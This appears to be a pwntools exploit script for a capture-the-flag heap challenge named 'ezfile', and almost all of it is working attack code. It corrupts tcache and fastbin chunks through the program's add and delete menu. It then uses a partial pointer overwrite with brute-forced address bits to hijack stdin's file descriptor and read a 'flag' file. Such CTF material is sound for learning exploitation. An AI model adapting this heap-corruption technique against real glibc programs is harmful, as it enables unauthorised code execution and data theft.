#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols* /tmp/gdb_pid /tmp/gdb_script')
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols.c', 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
# except Exception as e:
#     pass

context.arch = 'amd64'
# context.arch = 'i386'
# context.log_level = 'debug'
execve_file = './ezfile'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols.so'})
sh = process(execve_file)
# sh = remote('', 0)
elf = ELF(execve_file)
# libc = ELF('./libc-2.27.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''

    b *$rebase(0x10e4)
    '''

    f = open('/tmp/gdb_pid', 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script', 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    pass

def add(size, content):
    sh.sendlineafter('>>', '1')
    sh.sendlineafter('>>', str(size))
    sh.sendafter('>>', content)

def delete(index):
    sh.sendlineafter('>>', '2')
    sh.sendlineafter('>>', str(index))

sh.sendafter(': ' , 'a' * 90)

add(0x10, p64(0) + p64(0x21))
for i in range(6):
    add(0x18, '\n')

# # # Let fd of the chunk leave  the address of the zero index chunk
for i in range(7):
    delete(0)

# put the chunk into fastbin
delete(1)

add(1, p8(0x80))
add(0x1, p8(0x90))
add(0x11, p64(0) + p64(0xa1) + '\n')

for i in range(8):
    delete(1)

delete(9)
# control fd of the chunk 
two_byte = p16(0xa60 + random.randint(0, 0xf) * 0x1000)
# two_byte = '\x60\xfa'

# edit size and the value of fd
add(0x10 + len(two_byte), p64(0) + p64(0x21) + two_byte)
add(0x18, '\n')

# hijack stdin->_fileno
add(0x1, p8(3))

sh.sendlineafter('>>', '3')
sh.sendlineafter('>>', '0') # O_RDONLY

payload = 'flag\0'.ljust(0x68, '\0') + p16(0x14c + random.randint(0, 0xf) * 0x1000)
# payload = 'flag\0'.ljust(0x68, '\0') + '\x4c\x51'
sh.sendlineafter('>', str(len(payload)))
sh.sendafter('>>', payload)

sh.interactive()
clear()